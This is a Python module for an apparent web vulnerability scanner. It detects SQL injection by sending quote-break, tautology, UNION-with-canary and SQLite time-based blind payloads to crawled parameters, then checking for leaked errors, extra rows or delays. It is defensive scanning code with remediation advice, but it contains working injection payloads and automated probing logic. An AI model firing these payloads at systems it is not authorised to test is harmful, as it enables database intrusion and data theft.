import time
import httpx
from typing import List
from app.scanner.detectors.base import BaseDetector, Finding
from app.scanner.cvss import CVSSv31Calculator
from app.scanner.payloads import SQLI_PAYLOADS

class SQLiDetector(BaseDetector):
    name = "SQL Injection Detector"
    vuln_type = "SQL Injection (SQLi)"

    SQL_ERROR_PATTERNS = [
        "sqlite3.OperationalError",
        "OperationalError",
        "syntax error",
        "unrecognized token",
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "PG::SyntaxError:",
        "ORA-00933",
        "Microsoft OLE DB Provider for SQL Server",
        "executed_sql",   # Target1 leaks the executed SQL on error
        "near \"'\"",
        "unterminated quoted string",
    ]

    @staticmethod
    def _clean_echoed_tags(html: str) -> str:
        import re
        # Strip <script> and <style> blocks (which echo search/query parameters in JS variables)
        cleaned = re.sub(r'<script\b[^>]*>.*?</script>', '', html, flags=re.I | re.DOTALL)
        cleaned = re.sub(r'<style\b[^>]*>.*?</style>', '', cleaned, flags=re.I | re.DOTALL)
        # Strip URLs in href, src, action, data- attributes (quoted or unquoted)
        cleaned = re.sub(r'(?:href|src|action|data-[a-z0-9_\-]+)\s*=\s*["\'][^"\']*["\']', '', cleaned, flags=re.I)
        cleaned = re.sub(r'(?:href|src|action)\s*=\s*[^ >]+', '', cleaned, flags=re.I)
        # Strip <input>, <textarea>, <title>, <meta> tags which echo form/search parameters
        cleaned = re.sub(r'<input[^>]*>', '', cleaned, flags=re.I)
        cleaned = re.sub(r'<textarea[^>]*>.*?</textarea>', '', cleaned, flags=re.I | re.DOTALL)
        cleaned = re.sub(r'<title>.*?</title>', '', cleaned, flags=re.I | re.DOTALL)
        cleaned = re.sub(r'<meta[^>]*>', '', cleaned, flags=re.I)
        return cleaned


    # Additional probe endpoints to try for SQLi

    PROBE_PATHS = [
        "/search",
        "/api/search",
        "/query",
        "/products/search",
    ]

    async def scan(self, client: httpx.AsyncClient, base_url: str, crawl_result: Optional[Any] = None) -> List[Finding]:
        findings: List[Finding] = []
        base = base_url.rstrip('/')

        # Identify candidate endpoints & parameters to test
        candidates: List[dict] = []

        # 1. From Crawler Attack Surface
        if crawl_result and hasattr(crawl_result, "endpoints"):
            for ep in crawl_result.endpoints:
                # Check query params
                for param_name in ep.params.keys():
                    candidates.append({
                        "url": ep.url.split("?")[0],
                        "method": ep.method,
                        "param": param_name,
                        "is_form": False
                    })
                # Check form inputs
                for param_name in ep.form_data.keys():
                    candidates.append({
                        "url": ep.url,
                        "method": ep.method,
                        "param": param_name,
                        "is_form": True
                    })

        # 2. Heuristic fallback search endpoints
        for path in self.PROBE_PATHS:
            candidates.append({
                "url": f"{base}{path}",
                "method": "GET",
                "param": "q",
                "is_form": False
            })

        # Deduplicate candidates by (url, method, param)
        seen_candidates = set()
        unique_candidates = []
        for c in candidates:
            ck = (c["url"], c["method"], c["param"])
            if ck not in seen_candidates:
                seen_candidates.add(ck)
                unique_candidates.append(c)

        working_endpoint_info = None
        for c in unique_candidates:
            try:
                if c["method"] == "GET":
                    r = await client.get(c["url"], params={c["param"]: "test"}, timeout=4.0)
                else:
                    r = await client.post(c["url"], data={c["param"]: "test"}, timeout=4.0)
                # Check soft-404 if crawler provided it
                soft_404 = getattr(crawl_result, "soft_404", None)
                if soft_404 and soft_404.is_dead_or_soft_404(r):
                    continue
                if r.status_code in [200, 400, 500]:
                    working_endpoint_info = c
                    break
            except Exception:
                continue

        if not working_endpoint_info:
            return findings

        target_endpoint = working_endpoint_info["url"]
        target_param = working_endpoint_info["param"]
        target_method = working_endpoint_info["method"]
        target_is_form = working_endpoint_info["is_form"]

        # 1. Baseline Request
        import uuid
        canary_marker = f"AEGIS_SQLI_{uuid.uuid4().hex[:8].upper()}"
        try:
            t_base_0 = time.time()
            if target_method == "GET":
                baseline_resp = await client.get(target_endpoint, params={target_param: "AeroBlade"})
            else:
                baseline_resp = await client.post(target_endpoint, data={target_param: "AeroBlade"})
            baseline_time = time.time() - t_base_0
            baseline_text = baseline_resp.text.lower()
        except Exception:
            return findings

        sqli_probes = [
            {"id": "ERR-01", "name": "Error-Based Single Quote", "payload": "'", "type": "error"},
            # Force SQLite/MySQL/PostgreSQL errors
            {"id": "ERR-04", "name": "LIKE Break Quote", "payload": "' LIKE '", "type": "error"},
            {"id": "ERR-05", "name": "Stacked Quote Terminator", "payload": "'; SELECT 1--", "type": "error"},
            {"id": "ERR-06", "name": "Unbalanced Parenthesis", "payload": "') OR ('1'='1", "type": "error"},
            # Boolean tautologies that dump all rows
            {"id": "ERR-02", "name": "Error-Based SQL Comment", "payload": "' OR '1'='1' --", "type": "boolean"},
            {"id": "ERR-03", "name": "Tautology Dump", "payload": "' OR '1'='1", "type": "boolean"},
            {"id": "ERR-07", "name": "Tautology 1=1", "payload": "x' OR 1=1--", "type": "boolean"},
            # UNION-based with unique canary injection
            {"id": "UNION-01", "name": "UNION Extraction 5-col", "payload": f"' UNION SELECT 1,'{canary_marker}',3,4,5 --", "type": "union"},
            {"id": "UNION-02", "name": "UNION Extraction 6-col", "payload": f"' UNION SELECT 1,'{canary_marker}',3,4,5,6 --", "type": "union"},
            {"id": "UNION-03", "name": "UNION Extraction 4-col", "payload": f"' UNION SELECT 1,'{canary_marker}',3,4 --", "type": "union"},
            # Time-based blind
            {"id": "TIME-01", "name": "Time-Based Blind (SQLite)", "payload": "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--", "type": "time_based"},
        ]

        # Merge with payloads from payloads.py
        all_probes = sqli_probes
        try:
            for p in SQLI_PAYLOADS:
                if p not in all_probes:
                    all_probes.append(p)
        except Exception:
            pass

        for p_data in all_probes:
            payload = p_data["payload"]
            t0 = time.time()
            try:
                if target_method == "GET":
                    resp = await client.get(target_endpoint, params={target_param: payload}, timeout=5.0)
                else:
                    resp = await client.post(target_endpoint, data={target_param: payload}, timeout=5.0)
                elapsed = time.time() - t0
                body = resp.text

                # Check if blocked by WAF
                if resp.status_code == 403 and "blocked_by_waf" in body:
                    continue

                is_vulnerable = False
                evidence = ""

                # Check for SQL Error Leakage (Error-based) - must NOT be in baseline
                for err in self.SQL_ERROR_PATTERNS:
                    if err.lower() in body.lower() and err.lower() not in baseline_text:
                        is_vulnerable = True
                        evidence = f"Database syntax error leaked in response: '{err}'"
                        break

                # Check for Boolean-blind Tautology Extraction (structured JSON count expansion)
                if not is_vulnerable and ("OR '1'='1" in payload or "OR 1=1" in payload):
                    import re
                    m_inj = re.search(r'"count"\s*:\s*(\d+)', body)
                    m_base = re.search(r'"count"\s*:\s*(\d+)', baseline_resp.text)
                    if m_inj and int(m_inj.group(1)) > 0:
                        base_cnt = int(m_base.group(1)) if m_base else 0
                        if int(m_inj.group(1)) > base_cnt:
                            is_vulnerable = True
                            evidence = f"Tautology injection resulted in full table dump ({m_inj.group(1)} rows vs {base_cnt} baseline via 'OR 1=1')."
                    # Also check if 'data' array is populated vs baseline empty
                    if not is_vulnerable and '"data":[]' in baseline_resp.text.replace(' ', ''):
                        if re.search(r'"data"\s*:\s*\[\s*\{', body):
                            is_vulnerable = True
                            evidence = "Tautology injection ('OR 1=1') bypassed WHERE clause and returned records not in baseline."

                # Check for UNION data reflection via unique canary (must not be an echo inside href/input/title)
                if not is_vulnerable and "UNION SELECT" in payload.upper():
                    cleaned_body = self._clean_echoed_tags(body)
                    if canary_marker in cleaned_body and canary_marker not in baseline_resp.text:
                        is_vulnerable = True
                        evidence = f"UNION-based injection confirmed: canary string '{canary_marker}' reflected in database response."


                # Check for Time-based execution differential (must be >= 3.0s delay relative to baseline)
                if not is_vulnerable and p_data.get("type") == "time_based":
                    if baseline_time < 1.5 and elapsed >= (baseline_time + 2.8) and elapsed >= 3.0:
                        is_vulnerable = True
                        evidence = f"Significant time delay detected: {elapsed:.2f}s execution latency (baseline: {baseline_time:.2f}s)."

                if is_vulnerable:
                    cvss = CVSSv31Calculator.calculate(
                        av="N", ac="L", pr="N", ui="N", s="U", c="H", i="H", a="H"
                    )

                    curl_cmd = f'curl -s -X {target_method} "{target_endpoint}?{target_param}={payload}"' if target_method == "GET" else f'curl -s -X POST "{target_endpoint}" -d "{target_param}={payload}"'
                    req_raw = f"{target_method} {target_endpoint} HTTP/1.1\nParameter: {target_param}={payload}\nUser-Agent: Aegis-DAST-Scanner/1.0"
                    resp_raw = f"HTTP/1.1 {resp.status_code}\nContent-Type: {resp.headers.get('content-type', 'text/html')}\nContent-Length: {len(body)}\n\n{body[:600]}"

                    findings.append(
                        Finding(
                            id=f"VULN-SQLI-{p_data['id']}",
                            title=f"SQL Injection via '{p_data['name']}' in parameter '{target_param}'",
                            vuln_type=self.vuln_type,
                            severity=cvss["severity"],
                            cvss_score=cvss["base_score"],
                            cvss_vector=cvss["vector_string"],
                            endpoint=target_endpoint,
                            method=target_method,
                            parameter=target_param,
                            payload_used=payload,
                            evidence=evidence,
                            cwe_id="CWE-89",
                            owasp_category="A03:2021-Injection",
                            curl_command=curl_cmd,
                            request_raw=req_raw,
                            response_raw=resp_raw,
                            remediation_summary="Implement parameterized prepared statements (e.g., cursor.execute('... WHERE q = ?', (q,))) or utilize an ORM to decouple untrusted input from the SQL query compiler."
                        )
                    )


                    # Once a primary SQLi is confirmed on this parameter, we have sufficient PoC
                    if len(findings) >= 2:
                        break

            except Exception:
                continue

        return findings
